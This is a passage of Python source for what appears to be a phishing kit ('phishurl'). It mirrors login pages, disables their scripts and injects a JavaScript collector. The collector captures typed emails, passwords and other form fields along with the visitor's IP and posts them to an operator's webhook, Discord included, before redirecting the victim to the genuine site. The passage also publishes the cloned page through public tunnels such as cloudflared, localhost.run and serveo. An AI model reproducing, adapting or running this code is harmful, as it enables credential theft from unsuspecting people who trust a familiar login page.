            i = limit if end < 0 else end + 1
            continue
        opener = TAG_OPEN_RE.match(html, lt)
        if not opener:
            i = lt + 1
            continue
        end = _tag_end(html, lt)
        if end < 0:
            break
        name = opener.group("name").lower()
        if opener.group("close") != "/":
            if name == "form":
                forms += 1
                ops.extend(_form_ops(html, opener.end(), end))
            elif name in ("button", "input"):
                for match in ATTR_TOKEN_RE.finditer(html[opener.end():end]):
                    if match.group("name").lower() == "formaction":
                        ops.append((opener.end() + match.start(),
                                    opener.end() + match.end(), ""))
            if name in RAW_BODIES:
                closer = lower.find(f"</{name}", end)
                i = limit if closer < 0 else closer
                continue
        i = end

    out = _apply_ops(html, ops)
    if forms and 'data-phishurl="guard"' not in out:
        marker = out.lower().rfind("</body>")
        out = (out[:marker] + SUBMIT_GUARD + out[marker:]) if marker >= 0 \
            else out + SUBMIT_GUARD
    return out, forms


# ---------------------------------------------------------------------------
# 9a. freeze
#
# Some pages arrive complete — form, labels, buttons in the bytes — and then their
# own bundle boots, asks for chunks it composes at runtime, fails to mount and
# replaces the server-rendered markup with a spinner. Those chunk names are not in
# the document, so no mirror can supply them, and a visitor staring at a spinner is
# not looking at the page at all.
#
# Freezing turns every external script into dead weight the parser skips. The
# markup the site sent stays on screen, the stylesheet still applies, and the
# collector we inject is inline so it keeps running.
# ---------------------------------------------------------------------------

FROZEN_ATTR = "data-phishurl-frozen"
SCRIPT_SRC_RE = re.compile(r"<script\b([^>]*?)\bsrc\s*=\s*(['\"])([^'\"]+)\2([^>]*)>", re.I)


def freeze_scripts(html: str) -> tuple[str, int]:
    """Unplug the page's external scripts. Returns the document and the count."""
    frozen = 0

    def swap(match: re.Match[str]) -> str:
        nonlocal frozen
        attrs = match.group(1) + match.group(4)
        if FROZEN_ATTR in attrs.lower():
            return match.group(0)
        frozen += 1
        rest = attrs.rstrip().rstrip("/")
        return (f'<script{FROZEN_ATTR} type="text/plain"{rest} '
                f'src="{match.group(3)}">')

    return SCRIPT_SRC_RE.sub(swap, html), frozen


# ---------------------------------------------------------------------------
# 9b. capture
#
# A mirror with a login form is a photograph until something in the page collects
# what is typed into it. One script, dropped before </body> of every mirrored page,
# does four things and nothing else:
#
#   · listens for submit in the capture phase, before the page's own handler
#   · reads every named field in the form, plus the email/password pair by type
#   · posts the lot to the operator's webhook from the visitor's browser — the
#     tunnel is a static file server, it cannot forward a POST, and a phish page
#     does not need it to: the sink is wherever the webhook points
#   · bounces the visitor to the real site, so the page they were expecting is the
#     page they land on
#
# Deliberately dependency-free and failure-tolerant: a blocked sink must not break
# the form, and a broken script must not break the page.
# ---------------------------------------------------------------------------

CAPTURE_MARK = "<!--phishurl:capture-->"
CAPTURE_END = "<!--/phishurl:capture-->"
CAPTURE_STRIP_RE = re.compile(re.escape(CAPTURE_MARK) + r".*?" + re.escape(CAPTURE_END),
                              re.S)

CAPTURE_JS = r"""
(function(){
  var W=%s, R=%s, J=%s, A=%s;
  if(!W && !A) return;
  var seen={}, boot=Date.now();
  function pick(el){
    var t=(el.getAttribute('type')||el.type||'text').toLowerCase();
    if(t==='hidden'&&!el.value) return '';
    if(t==='submit'||t==='button'||t==='reset'||t==='image'||t==='file') return '';
    var v=el.value;
    if(v===undefined||v===null||v==='') return '';
    return String(v).slice(0,600);
  }
  function label(el){
    return (el.getAttribute('name')||el.id||el.getAttribute('placeholder')||
            el.getAttribute('aria-label')||el.getAttribute('autocomplete')||
            el.type||'field').slice(0,80);
  }
  function harvest(root){
    var out={}, pairs=[], scope=root||document;
    var nodes=scope.querySelectorAll('input,textarea,select');
    for(var i=0;i<nodes.length;i++){
      var v=pick(nodes[i]); if(!v) continue;
      var k=label(nodes[i]); if(out[k]===undefined) out[k]=v; else out[k+'.'+i]=v;
      pairs.push(k+'='+v);
    }
    var pw='', em='';
    var pwEl=scope.querySelector('input[type=password]')||document.querySelector('input[type=password]');
    if(pwEl) pw=pwEl.value||'';
    var emEl=document.querySelector('input[type=email],input[name*=mail i],input[id*=mail i],input[name*=user i],input[id*=user i],input[type=text]');
    if(emEl) em=emEl.value||'';
    return {fields:out, pairs:pairs, password:String(pw||''), email:String(em||'')};
  }
  function text(p){
    return 'login captured · '+p.email+' / '+p.password+'\n'+location.href+'\n'+
           p.ua+'\n'+p.t;
  }
  function push(p){
    var key=(p.email||'')+'|'+(p.password||'')+'|'+(p.fields?Object.keys(p.fields).length:0);
    if(seen[key]) return; seen[key]=1;
    if(W){
      // discord wants multipart with payload_json; any other sink takes the raw
      // json as text/plain, which is a simple request and needs no preflight —
      // a json content-type would be blocked on a third-party endpoint
      var body=null;
      if(/discord(app)?\.com\//.test(W)){
        try{
          body=new FormData();
          body.append('payload_json', JSON.stringify({content:text(p).slice(0,1900)}));
          body.append('data', JSON.stringify(p));
        }catch(e){ body=null; }
      }
      try{
        fetch(W,{method:'POST',mode:'no-cors',body:body||JSON.stringify(p),
                 headers:body?undefined:{'Content-Type':'text/plain;charset=UTF-8'}})
          .catch(function(){});
      }catch(e){}
    }
    if(A&&J&&/^(127\.0\.0\.1|localhost|\[::1\])$/.test(location.hostname)){
      try{
        var raw=JSON.stringify(p);
        var blob=new Blob([raw],{type:'text/plain;charset=UTF-8'});
        var sent=false;
        try{ if(navigator.sendBeacon) sent=navigator.sendBeacon(A+'/api/jobs/'+J+'/capture',blob); }catch(e){}
        if(!sent){
          fetch(A+'/api/jobs/'+J+'/capture',{method:'POST',mode:'no-cors',
                headers:{'Content-Type':'text/plain;charset=UTF-8'},body:raw})
            .catch(function(){});
        }
      }catch(e){}
    }
  }
  function ip(){
    return new Promise(function(done){
      var t=setTimeout(function(){done('');},900);
      try{
        fetch('https://api.ipify.org?format=json',{mode:'cors'})
          .then(function(r){return r.json();})
          .then(function(j){clearTimeout(t);done((j&&j.ip)||'');})
          .catch(function(){clearTimeout(t);done('');});
      }catch(e){clearTimeout(t);done('');}
    });
  }
  function fire(form){
    var base=harvest(form);
    var p={fields:base.fields, pairs:base.pairs, email:base.email,
           password:base.password, page:location.href, title:document.title,
           ua:navigator.userAgent, ref:document.referrer||'',
           t:new Date().toISOString(), job:J, ip:''};
    var go=function(){
      push(p);
      if(R) setTimeout(function(){try{location.replace(R);}catch(e){}},380);
    };
    ip().then(function(addr){ p.ip=addr; go(); }, go);
  }
  document.addEventListener('submit',function(e){
    var f=e.target; if(!f||f.tagName!=='FORM') return;
    try{ fire(f); }catch(err){}
  },true);
  document.addEventListener('click',function(e){
    var t=e.target; if(!t||!t.closest) return;
    var btn=t.closest('button,[type=submit],[role=button]');
    if(!btn) return;
    var f=btn.form||btn.closest('form');
    if(!f) return;
    setTimeout(function(){try{fire(f);}catch(err){}},0);
  },true);
  try{
    var p0=harvest(document.querySelector('form')||document);
    if(p0.password) push({fields:p0.fields,pairs:p0.pairs,email:p0.email,
      password:p0.password,page:location.href,title:document.title,
      ua:navigator.userAgent,ref:document.referrer||'',
      t:new Date().toISOString(),job:J,ip:''});
  }catch(e){}
})();
"""


def inject_capture(html: str, job: "Job") -> str:
    """Drop the collector into a page. Idempotent: the block is stripped first."""
    html = CAPTURE_STRIP_RE.sub("", html)
    if not (job.options.webhook or job.id):
        return html
    script = (
        "<script data-phishurl=\"capture\">"
        + CAPTURE_JS % (json.dumps(job.options.webhook), json.dumps(job.options.redirect),
                        json.dumps(job.id), json.dumps(job.app_base))
        + "</script>"
    )
    block = CAPTURE_MARK + script + CAPTURE_END
    marker = html.lower().rfind("</body>")
    if marker >= 0:
        return html[:marker] + block + html[marker:]
    return html + block


def finalise_page(job: "Job", html: str) -> str:
    """Sanitise, then arm. Every path that writes a page ends here, so a healer
    re-render cannot quietly drop the collector or re-enable a form action."""
    if job.options.sanitize:
        html, _forms = sanitize_forms(html)
    if job.options.webhook:
        html = inject_capture(html, job)
    return html


def referenced_names(pages: list["Page"]) -> set[str]:
    """Every file name the mirrored documents mention, lowercased.

    The healer needs this to tell two very different 404s apart. One is a real
    broken reference — a stylesheet the page asks for and the mirror does not have.
    The other is a name the page's own javascript composes at runtime, or an API
    call the copy was never going to answer. Writing a stand-in for the second kind
    is how a mirror gets filled with fifty-byte stubs, so only the first kind is a
    defect.
    """
    names: set[str] = set()
    for page in pages:
        for match in re.finditer(r"[A-Za-z0-9._@+-]{2,160}\.[A-Za-z0-9]{1,8}", page.html or ""):
            names.add(match.group(0).lower())
    return names


# ---------------------------------------------------------------------------
# 10. self-heal
#
# Six gates, measured against the mirror served over loopback (so relative paths,
# CORS and module URLs behave the way they will on pages.dev). Each failing gate
# hands the healer a diagnosis; the healer has exactly one action per diagnosis and
# six rounds to spend. No improvement between rounds ends the loop early — a fix
# that fixes nothing would otherwise churn forever.
# ---------------------------------------------------------------------------

GATE_NAMES = ("render", "assets", "style", "js", "nav", "form")
PLAYWRIGHT_MISSING = "playwright unavailable — static checks only"

PROBE_SCRIPT = """
() => {
  const out = {text: 0, sheets: 0, rules: 0, links: [], forms: [], title: document.title};
  out.text = (document.body && document.body.innerText || '').trim().length;
  try {
    for (const sheet of Array.from(document.styleSheets)) {
      out.sheets += 1;
      try { out.rules += (sheet.cssRules || []).length; } catch (e) {}
    }
  } catch (e) {}
  for (const a of Array.from(document.querySelectorAll('a[href]')).slice(0, 400)) {
    out.links.push({href: a.getAttribute('href'), abs: a.href});
  }
  for (const f of Array.from(document.querySelectorAll('form')).slice(0, 40)) {
    out.forms.push({action: f.getAttribute('action'), method: f.getAttribute('method')});
  }
  return out;
}
"""


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    # set per mirror, not globally: two jobs can be served at once
    entry = "index.html"

    def log_message(self, *args: Any) -> None:      # silence the loopback traffic
        return

    def do_GET(self) -> None:                        # noqa: N802 - stdlib spelling
        """A bare root lands on the mirrored page, not on a directory listing."""
        if self.path in ("", "/") and self.entry and self.entry != "index.html":
            self.send_response(302)
            self.send_header("Location", "/" + self.entry)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        super().do_GET()


class MirrorServer(socketserver.ThreadingTCPServer):
    """The loopback socket a browser opens six connections against at once.

    socketserver's default backlog is five. A mirrored page asks for its fonts, its
    sprites and its next chunk in one burst, so the sixth socket waits in a queue
    that is already full and the kernel answers the browser with a reset — the
    browser reports a refused connection and paints without that asset. That is the
    "unstyled page that changes shape on every reload" complaint arriving from a
    different direction, so the queue is deep enough that it cannot happen.
    """

    daemon_threads = True
    request_queue_size = 256


class LocalMirror:
    """Serves the mirror on 127.0.0.1 so the gate pass sees real HTTP semantics."""

    def __init__(self, root: Path, entry: str = "index.html"):
        self.root = root
        self.entry = entry or "index.html"
        self.httpd: Optional[socketserver.TCPServer] = None
        self.thread: Optional[threading.Thread] = None
        self.port = 0
        self.url = ""

    def __enter__(self) -> "LocalMirror":
        handler_cls = type("EntryHandler", (QuietHandler,), {"entry": self.entry})
        handler = functools.partial(handler_cls, directory=str(self.root))
        self.httpd = MirrorServer(("127.0.0.1", 0), handler)
        self.port = int(self.httpd.server_address[1])
        self.url = f"http://127.0.0.1:{self.port}/"
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        return self

    def __exit__(self, *exc: Any) -> None:
        if self.httpd is not None:
            self.httpd.shutdown()
            self.httpd.server_close()
        if self.thread is not None:
            self.thread.join(timeout=2)


# ---------------------------------------------------------------------------
# 12b. the public tunnel
#
# A folder is not a link. This turns one into the other: a loopback server rooted at
# the mirror, and an ssh reverse tunnel that hands serveo.net the other end of it.
# The address only exists after the ssh banner prints it, so it is parsed from the
# child's output — never guessed, never constructed from a template.
#
#   ssh -T -R 80:127.0.0.1:<port> serveo.net
#   Forwarding HTTP traffic from https://<name>.serveo.net
#
# Teardown runs in reverse: kill the ssh child first, then close the socket. A tunnel
# outliving its server is a public forward to a refused connection, which serveo
# answers with 502 until the forward expires.
# ---------------------------------------------------------------------------

TUNNEL_OPEN_TIMEOUT = 45.0
# A quick tunnel handshakes in ~12 s; localhost.run answers in ~4 s. Racing them
# flat means cloudflare always loses, which is the opposite of what was asked for.
# So cloudflared gets first refusal for this long while the ssh providers warm up
# behind it as a fallback: a trycloudflare address in ~12 s, or the fast one the
# moment cloudflared exits or the window closes.
TUNNEL_PREFER_WINDOW = 22.0
PREFER_CLOUDFLARED = CONFIG.tunnel.strip().lower() != "fastest"
# Every provider writes control sequences into its banner: coloured labels, a
# reverse-video QR code at localhost.run. None of it belongs in a log line.
ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")
# Lines that carry the reason a handshake failed. These are recorded, never acted on:
# a tunnel banner also prints help text ("if you get a permission denied error, check
# the faq…"), and aborting on that text kills a session that is about to work. The
# child exiting is the only signal that matters, and ExitOnForwardFailure=yes makes
# that exit fast.
TUNNEL_REFUSALS = (
    "permission denied (publickey", "permission denied (keyboard-interactive",
    "remote port forwarding failed", "administratively prohibited",
    "connect to host", "connection refused", "connection timed out",
    "connection reset", "host key verification failed", "could not resolve hostname",
    "no such file or directory", "bad configuration option",
)


# cloudflared is fetched beside the script rather than into Program Files: no
# elevation, no PATH edit, and the copy travels with the tool.
CLOUDFLARED_DIR = Path(__file__).resolve().parent / "bin"
CLOUDFLARED_ASSETS = {
    ("Windows", "AMD64"): "cloudflared-windows-amd64.exe",
    ("Windows", "x86"): "cloudflared-windows-386.exe",
    ("Linux", "x86_64"): "cloudflared-linux-amd64",
    ("Linux", "aarch64"): "cloudflared-linux-arm64",
    ("Linux", "arm64"): "cloudflared-linux-arm64",
}


def cloudflared_binary() -> str:
    """Path to cloudflared, fetching it into ./bin when the machine has none.

    A quick tunnel needs no account and no domain — `cloudflared tunnel --url`
    prints https://<words>.trycloudflare.com and starts routing in seconds, which
    is the whole reason this lane sits first in the race. The catch was the binary:
    asking a user to run winget before their link works is how the link ends up
    feeling broken. So the binary is fetched once, beside the script, verified by
    running --version, and reused forever after.

    Nothing is fetched when `PHISHURL_NO_FETCH=1`; the lane is then simply absent.
    """
    found = cloudflared_path()
    if found is not None:
        return str(found)
    raise TunnelError("cloudflared is not installed and could not be fetched — "
                      "install it with winget install Cloudflare.cloudflared")


def cloudflared_path() -> Optional[Path]:
    """PATH first, then the copy this tool fetched for itself."""
    found = shutil.which("cloudflared")
    if found:
        return Path(found)
    local = CLOUDFLARED_DIR / ("cloudflared.exe" if os.name == "nt" else "cloudflared")
    return local if local.is_file() else None


def fetch_cloudflared(progress: Optional[Callable[[str], None]] = None) -> Optional[Path]:
    """Fetch the release asset for this platform, atomically, and prove it runs.

    Returns None when the fetch is disabled or unsupported; the caller treats that
    as "this lane is not available" rather than an error, because two keyless ssh
    providers still work without it.
    """
    have = cloudflared_path()
    if have is not None:
        return have
    if os.environ.get("PHISHURL_NO_FETCH") == "1" or httpx is None:
        return None
    asset = CLOUDFLARED_ASSETS.get((platform.system(), platform.machine()))
    if asset is None:
        return None

    def say(line: str) -> None:
        if progress is not None:
            progress(line)

    target = CLOUDFLARED_DIR / ("cloudflared.exe" if os.name == "nt" else "cloudflared")
    part = target.with_name(target.name + ".part")
    url = (f"https://github.com/cloudflare/cloudflared/releases/latest/download/{asset}")
    try:
        CLOUDFLARED_DIR.mkdir(parents=True, exist_ok=True)
        say(f"fetching cloudflared · {asset}")
        with httpx.stream("GET", url, follow_redirects=True, timeout=httpx.Timeout(30.0)) as r:
            r.raise_for_status()
            total = int(r.headers.get("content-length") or 0)
            seen = 0
            last = -1
            with open(part, "wb") as handle:
                for chunk in r.iter_bytes(262_144):
                    handle.write(chunk)
                    seen += len(chunk)
                    # a 40 MB download with no sign of life reads as a hang
                    if total and seen * 10 // total != last:
                        last = seen * 10 // total
                        say(f"fetching cloudflared · {last * 10}%")
        # the rename is the publish: a half-written .part is never runnable
        os.replace(part, target)
        if os.name != "nt":
            target.chmod(0o755)
        check = subprocess.run([str(target), "--version"], capture_output=True,
                               text=True, timeout=30)
        if "cloudflared" not in (check.stdout + check.stderr).lower():
            target.unlink(missing_ok=True)
            say("cloudflared came down broken · lane skipped")
            return None
        say(f"cloudflared ready · {(check.stdout or '').strip()[:40]}")
        return target
    except Exception as exc:                                  # noqa: BLE001 - reported
        with contextlib.suppress(Exception):
            part.unlink(missing_ok=True)
        say(f"cloudflared fetch failed · {type(exc).__name__}: {exc}"[:160])
        return None


@dataclass(frozen=True)
class Provider:
    """One public endpoint, and the shape of the address it prints."""

    name: str
    host: str              # ssh destination, user included when the service wants one
    port: int
    remote: str            # "80" for a fixed public port, "0" for whatever is free
    url_re: re.Pattern     # the only place the public address may come from
    note: str
    kind: str = "ssh"      # "ssh" reverse forward, or a "cloudflared" quick tunnel

    def argv(self, local_port: int, subdomain: str = "") -> list[str]:
        """The command that opens the forward. Every value in it is declared here."""
        if self.kind == "cloudflared":
            return [cloudflared_binary(), "tunnel", "--no-autoupdate",
                    "--loglevel", "info", "--url", f"http://127.0.0.1:{local_port}"]
        remote = (f"{subdomain}:{self.remote}:127.0.0.1:{local_port}"
                  if subdomain else f"{self.remote}:127.0.0.1:{local_port}")
        return [
            ssh_binary(), "-T", "-p", str(self.port),
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "ServerAliveInterval=30",
            "-o", "ServerAliveCountMax=3",
            "-o", "ExitOnForwardFailure=yes",   # no silent half-open forward
            "-o", "BatchMode=yes",              # never block on a password prompt
            "-o", "ConnectTimeout=20",
            "-R", remote, self.host,
        ]


# All of these are asked at once. Whoever prints an address first wins and the rest
# are killed, so the wait is the fastest provider rather than the sum of the slow ones.
#
# serveo used to sit first because it was the one that got asked for. It now wants a
# key on most networks and spends its whole window refusing, which is exactly the
# stall that made a link feel broken — so it is last, and it is only reached when the
# two keyless doors are shut.
#
# cloudflared needs no account, no key and no browser: a quick tunnel prints
# https://<words>.trycloudflare.com and answers in seconds. It only joins the race
# when the binary is on PATH.
#
# The patterns are deliberately narrow. A tunnel banner is full of control-plane
# links — "manage custom domains at https://admin.localhost.run" — and a loose
# pattern hands back that page as if it were the mirror. Every subdomain these
# services allocate is a long random label, so the length floor does the filtering.
PROVIDERS: tuple[Provider, ...] = (
    Provider("cloudflared", "", 0, "",
             re.compile(r"https://(?P<host>[a-z0-9][a-z0-9-]{4,}\.trycloudflare\.com)", re.I),
             "trycloudflare.com · no account", "cloudflared"),
    Provider("localhost.run", "nokey@localhost.run", 22, "80",
             re.compile(r"(?<![a-z0-9.-])(?P<host>[a-z0-9][a-z0-9-]{7,}"
                        r"(?:\.app)?\.lhr\.life)", re.I),
             "localhost.run"),
    Provider("serveo", "serveo.net", 22, "80",
             re.compile(r"(?<![a-z0-9.-])(?P<host>[a-z0-9][a-z0-9-]{3,}\.serveo\.net)", re.I),
             "serveo.net"),
)


class TunnelError(RuntimeError):
    """The tunnel did not come up. The message is the reason, not a stack trace."""


def ssh_binary() -> str:
    """Path to an OpenSSH client, or a message naming how to get one."""
    found = shutil.which("ssh")
    if found:
        return found
    if sys.platform == "win32":
        bundled = (Path(os.environ.get("SystemRoot", r"C:\Windows"))
                   / "System32" / "OpenSSH" / "ssh.exe")
        if bundled.is_file():
            return str(bundled)
    raise TunnelError("no ssh client on PATH — Windows: Settings → Optional features → "
                      "OpenSSH Client")


class Attempt:
    """One provider, one handshake, owned alone so all of them can race.

    Nothing here touches the site until `adopted` is set: a losing attempt must be
    killable without leaving a mark on the winner's state.
    """

    def __init__(self, site: Any, provider: Provider, port: int):
        self.site = site
        self.provider = provider
        self.port = port
        self.process: Optional[subprocess.Popen] = None
        self.thread: Optional[threading.Thread] = None
        self.url = ""
        self.error = ""
        self.banner: list[str] = []
        self.warmed = False
        self.adopted = False
        self.ended = threading.Event()      # the child is gone, one way or another

    def verdict(self) -> str:
        """Empty while the attempt is still worth waiting on, else the reason."""
        if self.url or not self.ended.is_set():
            return ""
        return self.error or "printed no address"

    def launch(self) -> None:
        try:
            argv = self.provider.argv(self.port, self.site.subdomain)
        except TunnelError as exc:
            self.error = str(exc)[:200]
            self.ended.set()
            return
        creation = getattr(subprocess, "CREATE_NO_WINDOW", 0) if sys.platform == "win32" else 0
        try:
            self.process = subprocess.Popen(
                argv, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, encoding="utf-8",
                errors="replace", bufsize=1, creationflags=creation,
            )
        except OSError as exc:
            self.error = f"the client did not launch · {type(exc).__name__}: {exc}"[:200]
            self.ended.set()
            return
        self.thread = threading.Thread(target=self._read, daemon=True,
                                       name=f"tunnel-{self.provider.name}")
        self.thread.start()

    def _read(self) -> None:
        """Drain the child's output. The address arrives here and nowhere else."""
        process = self.process
        if process is None or process.stdout is None:
            self.ended.set()
            return
        try:
            for raw in process.stdout:
                # localhost.run prints a QR code in reverse video: escape sequences
                # and block glyphs that are worth nothing in a log line and would
                # otherwise be the "reason" quoted back to the console on a failure
                line = ANSI_RE.sub("", raw).strip()
                if not line or not any(ch.isalnum() for ch in line):
                    continue
                self.banner.append(line[:200])
                del self.banner[:-24]
                if not self.url:
                    match = self.provider.url_re.search(line)
                    if match:
                        self.url = f"https://{match.group('host')}/"
                        continue
                    lowered = line.lower()
                    if any(token in lowered for token in TUNNEL_REFUSALS):
                        self.error = self.error or line[:200]
                elif any(token in line.lower() for token in TUNNEL_REFUSALS):
                    self.error = self.error or line[:200]
        except Exception as exc:                       # closed pipe during teardown
            self.error = self.error or f"{type(exc).__name__}: {exc}"[:200]
        finally:
            self.error = self.error or ("the session ended" if self.url else "printed no address")
            self.ended.set()
            if self.adopted:
                # a live tunnel that loses its child is a dead tunnel, immediately
                with self.site._lock:
                    if self.site.state != "closed":
                        self.site.state = "dead"
                        self.site.error = self.error

    def stop(self) -> None:
        """Kill the child and its reader. Safe to call twice, safe on a loser."""
        process, self.process = self.process, None
        if process is not None and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=4)
            except subprocess.TimeoutExpired:
                with contextlib.suppress(Exception):
                    process.kill()
                    process.wait(timeout=2)
        if self.thread is not None and self.thread is not threading.current_thread():
            self.thread.join(timeout=2)
            self.thread = None
        if process is not None:
            for pipe in (process.stdout, process.stdin):
                with contextlib.suppress(Exception):
                    if pipe is not None:
                        pipe.close()


class PublicSite:
    """One mirror directory, served on loopback and forwarded to the public edge.

    The object owns both halves, so the lifetime is one decision: stop() closes the
    tunnel and the server together and leaves nothing behind.
    """

    def __init__(self, root: Path, subdomain: str = "", entry: str = "index.html"):
        self.root = Path(root).resolve()
        self.entry = entry or "index.html"
        self.subdomain = slugify(subdomain, 32).strip("-") if subdomain else ""
        self.server: Optional[LocalMirror] = None
        self.process: Optional[subprocess.Popen] = None
        self.thread: Optional[threading.Thread] = None
        self.provider: Optional[Provider] = None
        self.url = ""
        self.state = "opening"          # opening · live · dead · closed
        self.error = ""
        self.opened = utcnow()
        self.banner: list[str] = []
        self.tried: list[str] = []      # provider names, in the order they were asked
        self.claimed = False            # one runner per site, whoever asks first
        self._lock = threading.Lock()

    # -- halves ------------------------------------------------------------
    def _serve(self) -> int:
        """The loopback server, started once and shared by every attempt."""
        if self.server is None:
            server = LocalMirror(self.root, self.entry)
            server.__enter__()
            self.server = server
        return self.server.port

    def _close_server(self) -> None:
        with self._lock:
            server, self.server = self.server, None
        if server is not None:
            with contextlib.suppress(Exception):
                server.__exit__(None, None, None)

    def _candidates(self) -> list[Provider]:
        """Every door that can open here.

        cloudflared joins when the binary is present *or* this platform has a release
        asset — the fetch happens in `start()`, before the clock starts, so a machine
        without cloudflared still gets a trycloudflare.com link instead of silently
        falling back to an ssh provider that may refuse.
        """
        out: list[Provider] = []
        fetchable = (os.environ.get("PHISHURL_NO_FETCH") != "1"
                     and (platform.system(), platform.machine()) in CLOUDFLARED_ASSETS)
        for provider in PROVIDERS:
            if provider.kind == "cloudflared" and not (fetchable or cloudflared_path()):
                continue
            out.append(provider)
        return out

    def _warm(self, url: str, budget: float) -> bool:
        """A tunnel that printed an address is not yet a tunnel that answers.

        The edge allocates the hostname before it can route it, so a link handed over
        the instant the banner appears is a link that opens on the second or third try.
        This holds the address back until it has actually returned something.
        """
        if httpx is None:
            return True
        deadline = time.time() + budget
        while time.time() < deadline:
            try:
                response = httpx.get(url, timeout=4.0, follow_redirects=False,
                                     headers={"user-agent": UA_POOL[0]})
                if response.status_code < 500:
                    return True
            except Exception:
                pass
            time.sleep(0.4)
        return False

    # -- start -------------------------------------------------------------
    def start(self, timeout: float = TUNNEL_OPEN_TIMEOUT) -> str:
        """Serve the folder and return the first public URL that answers.

        Every provider is launched at the same moment and the first live address wins.
        The old shape tried them one after another, so a provider that was going to
        refuse spent its whole window doing it before the next one was even asked.
        """
        with self._lock:
            if self.state == "live" and self.url:
                return self.url
            if self.state == "closed":
                raise TunnelError("this site was already closed")
            if not self.root.is_dir():
                raise TunnelError(f"nothing to serve · {self.root} is not a directory")
            if not mirror_path(self.root, self.entry).is_file():
                raise TunnelError(f"the mirror has no entry page ({self.entry}) — "
                                  "clone the page first")

        port = self._serve()
        self.state = "opening"
        # 40 MB of silence inside the 45 s window would read as a hang, so the fetch
        # happens first, reports tenths into the banner the card already renders, and
        # the clock starts after it lands.
        if any(item.kind == "cloudflared" for item in self._candidates()):
            if cloudflared_path() is None:
                fetch_cloudflared(self.banner.append)
        deadline = time.time() + timeout
        attempts = [Attempt(self, provider, port) for provider in self._candidates()]
        if not attempts:
            self._close_server()
            raise TunnelError("no tunnel client available — install cloudflared "
                              "(winget install Cloudflare.cloudflared) or OpenSSH Client")

        self.state = "opening"
        for attempt in attempts:
            self.tried.append(attempt.provider.name)
            attempt.launch()

        reasons: list[str] = []
        pending = list(attempts)
        winner: Optional[Attempt] = None
        # cloudflared is the lane that was asked for; the ssh providers are its net.
        preferred = next((a for a in attempts if a.provider.kind == "cloudflared"), None)
        reserved: Optional[Attempt] = None
        prefer_until = time.time() + min(TUNNEL_PREFER_WINDOW, timeout) if preferred else 0.0

        def still_holding() -> bool:
            """True while cloudflared is alive, unwon, and inside its window."""
            return (PREFER_CLOUDFLARED and preferred is not None
                    and preferred in pending and time.time() < prefer_until)

        while winner is None and pending and time.time() < deadline:
            broke = False
            for attempt in list(pending):
                verdict = attempt.verdict()
                if verdict:
                    reasons.append(f"{attempt.provider.name}: {verdict}")
                    pending.remove(attempt)
                    attempt.stop()
                    continue
                if attempt.url and not attempt.warmed:
                    attempt.warmed = True
                    # the trycloudflare edge publishes the name before it routes it, and
                    # that gap runs longer than the ssh providers' — 5 s there is a link
                    # killed one second before it would have answered
                    budget = 14.0 if attempt.provider.kind == "cloudflared" else 5.0
                    if self._warm(attempt.url, budget):
                        if still_holding() and attempt is not preferred and reserved is None:
                            # a fast address held behind a better one; it is adopted the
                            # moment cloudflared is out, and stopped at the end if not
                            reserved = attempt
                            pending.remove(attempt)
                            reasons.append(f"{attempt.provider.name}: {attempt.url} in reserve")
                            continue
                        winner = attempt
                        broke = True
                        break
                    reasons.append(f"{attempt.provider.name}: {attempt.url} never answered")
                    pending.remove(attempt)
                    attempt.stop()
            if not broke and pending:
                if reserved is not None and not still_holding():
                    winner = reserved
                    break
                time.sleep(0.2)
        if winner is None and reserved is not None:
            winner = reserved

        for attempt in attempts:
            if attempt is not winner:
                attempt.stop()

        if winner is None:
            self.state = "dead"
            self._close_server()
            self.error = " · ".join(reasons) or "no tunnel provider answered"
            raise TunnelError(self.error)

        self._adopt(winner)
        return self.url

    def _adopt(self, attempt: "Attempt") -> None:
        """Take the winner's child and reader thread as this site's own."""
        attempt.adopted = True
        with self._lock:
            self.process = attempt.process
            self.thread = attempt.thread
            self.provider = attempt.provider
            self.banner = attempt.banner
            self.url = attempt.url
            self.state = "live"
            self.error = ""

    # -- teardown ----------------------------------------------------------
    def stop(self) -> None:
        """Child first, socket second. Re-entrant and safe from any thread."""
        with self._lock:
            if self.state == "closed" and self.process is None and self.server is None:
                return
            self.state = "closed"
            process, self.process = self.process, None
            thread, self.thread = self.thread, None
        if process is not None and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                with contextlib.suppress(Exception):
                    process.kill()
                    process.wait(timeout=3)
        if thread is not None and thread is not threading.current_thread():
            thread.join(timeout=2)
        if process is not None:
            for pipe in (process.stdout, process.stdin):
                with contextlib.suppress(Exception):
                    if pipe is not None:
                        pipe.close()
        self._close_server()
        with self._lock:
            self.url = ""

    # -- state -------------------------------------------------------------
    def status(self) -> dict[str, Any]:
        process = self.process
        if self.state == "live" and (process is None or process.poll() is not None):
            self.state = "dead"
            self.error = self.error or "the tunnel session ended"
        return {
            "url": self.url, "state": self.state, "error": self.error,
            "root": str(self.root), "subdomain": self.subdomain,
            "provider": self.provider.name if self.provider else "",
            "providers": [item.name for item in self._candidates()], "tried": self.tried,
            "port": self.server.port if self.server else 0,
            "opened": self.opened, "banner": self.banner[-5:],
        }


TUNNELS: dict[str, PublicSite] = {}
TUNNEL_LOCK = threading.Lock()


def tunnel_for(job_id: str) -> Optional[PublicSite]:
    with TUNNEL_LOCK:
        return TUNNELS.get(job_id)


def close_tunnel(job_id: str) -> bool:
    """Tear a tunnel down and forget it. True when there was one to close."""
    with TUNNEL_LOCK:
        site = TUNNELS.pop(job_id, None)
    if site is None:
        return False
    site.stop()
    return True


def publish_mirror(job: Job, subdomain: str = "") -> PublicSite:
    """One mirror, one tunnel, opened in the background.

    serveo takes a few seconds to allocate the forward, so the call returns while the
    ssh child is still handshaking; `status()['state']` is what the caller watches.
    A second call on a live job reuses the forward rather than orphaning the first —
    serveo rate-limits new allocations, and a leaked ssh child is a public page
    nobody is looking after.
    """
    with TUNNEL_LOCK:
        site = TUNNELS.get(job.id)
        if site is not None and site.state in ("opening", "live"):
            return site
        if site is not None:
            site.stop()
        site = PublicSite(Path(job.mirror), subdomain, public_entry(Path(job.mirror), job))
        TUNNELS[job.id] = site
